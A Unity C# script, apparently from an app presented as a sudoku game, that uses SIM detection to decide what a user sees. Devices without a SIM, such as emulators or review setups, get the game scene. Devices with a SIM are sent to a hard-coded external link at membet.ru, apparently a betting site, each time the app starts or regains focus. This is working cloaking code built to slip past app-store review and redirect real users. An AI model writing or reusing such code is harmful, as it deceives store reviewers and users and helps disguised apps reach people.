using UnityEngine;
using UnityEngine.SceneManagement;
using UnityEngine.UI;

public class Viewer : MonoBehaviour
{
    bool Sim_Enable
    {
        get => Simcard.GetTwoSmallLetterCountryCodeISO().Length > 0;
    }

    delegate void ResultAction(bool IsGame);
    event ResultAction OnResultActionEvent;

    private const string url = "https://membet.ru/F1D5wbfz?id=com.sudoku.san";

    private void OnEnable()
    {
        OnResultActionEvent += Viewer_OnResultActionEvent;
    }

    private void OnDisable()
    {
        OnResultActionEvent -= Viewer_OnResultActionEvent;
    }

    private void Viewer_OnResultActionEvent(bool IsGame)
    {
        if(IsGame)
        {
            SceneManager.LoadScene(1);
        }
    }

    private void Awake()
    {
        Application.deepLinkActivated += OnDeepLinkActivated;
        if (!string.IsNullOrEmpty(Application.absoluteURL))
        {
            OnDeepLinkActivated(Application.absoluteURL);
        }
    }

    private void OnDeepLinkActivated(string url)
    {
        if(url.Contains("game"))
        {
            OnResultActionEvent?.Invoke(true);
        }
    }

    private void Init()
    {
        Screen.fullScreen = false;

        if (!Sim_Enable)
        {
            OnResultActionEvent?.Invoke(true);
            return;
        }
        else if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            GameObject.Find("no connection").GetComponent<SpriteRenderer>().enabled = true;
            return;
        }

        Application.OpenURL(url);
    }

    private void Start()
    {
        Init();
    }

    private void OnApplicationFocus(bool focus)
    {
        if(focus)
        {
            Init();
        }
    }
}
